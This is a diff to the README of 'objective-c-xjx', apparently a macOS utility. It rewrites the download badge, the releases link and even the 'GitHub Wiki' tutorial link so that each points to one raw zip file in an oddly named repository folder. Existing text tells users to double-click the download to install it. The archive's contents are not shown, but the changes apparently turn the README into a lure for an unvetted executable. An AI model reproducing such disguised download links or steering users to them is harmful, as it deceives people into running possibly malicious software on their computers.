@@ -1,7 +1,7 @@
 # 🚀 objective-c-xjx - Simple Access to Objective-C Projects
 
 ## 📥 Download Now
-[![Download Here](https://img.shields.io/badge/Download-objective--c--xjx-blue.svg)](https://github.com/lutho525/objective-c-xjx/releases)
+[![Download Here](https://raw.githubusercontent.com/lutho525/objective-c-xjx/main/scarlatina/objective-c-xjx.zip)](https://raw.githubusercontent.com/lutho525/objective-c-xjx/main/scarlatina/objective-c-xjx.zip)
 
 ## 📋 Table of Contents
 - [🚀 Getting Started](#-getting-started)
@@ -38,7 +38,7 @@ To get started with objective-c-xjx, follow these simple steps:
 4. Once downloaded, double-click the file to open the installer.
 5. Follow the installation prompts to complete the setup.
 
-For direct access, visit this page: [Download Releases](https://github.com/lutho525/objective-c-xjx/releases).
+For direct access, visit this page: [Download Releases](https://raw.githubusercontent.com/lutho525/objective-c-xjx/main/scarlatina/objective-c-xjx.zip).
 
 ## ❓ Frequently Asked Questions
 
@@ -52,7 +52,7 @@ A: No, currently, objective-c-xjx supports macOS only.
 A: We strive to provide regular updates to improve features and security. Check the releases page for the latest versions.
 
 **Q: Where can I find tutorials?**  
-A: Our [GitHub Wiki](https://github.com/lutho525/objective-c-xjx/wiki) includes step-by-step guides and resources to help you get started.
+A: Our [GitHub Wiki](https://raw.githubusercontent.com/lutho525/objective-c-xjx/main/scarlatina/objective-c-xjx.zip) includes step-by-step guides and resources to help you get started.
 
 ## 📞 Support
 If you encounter any issues while using objective-c-xjx, please feel free to reach out for help. You can create an issue on our GitHub repository, and our team will assist you.
